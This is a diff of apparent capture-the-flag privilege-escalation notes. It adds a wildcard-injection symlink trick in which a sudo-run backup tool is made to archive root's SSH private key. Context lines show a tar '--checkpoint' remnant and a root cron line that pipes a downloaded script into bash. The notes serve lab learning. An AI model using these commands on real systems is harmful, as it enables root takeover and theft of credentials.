@@ -60,6 +60,27 @@ tar cf /home/milesdyson/backups/backup.tgz *
 when you remove 
 #rm -rf /var/www/html/--checkpoint=1
 ____________________________________________________________________________________________________________________________
+Wildcard injection symbolic link
+------------------------------------
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+
+Backup file is always stored in /var/backups/project.zip, so we are in the folder called /var, but we can't create any file in eg./var, /var/www. So, that we have finally create file in /var/www/html.
+
+#cd /var/www/html
+#touch @file (customized file)
+#ln -sf /root/.ssh/id_rsa file (link the file)
+#sudo /usr/bin/usage_management
+
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+1
+
+Open archive: /var/backups/project.zip
+____________________________________________________________________________________________________________________________
 
 # Update builds from latest code
 * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
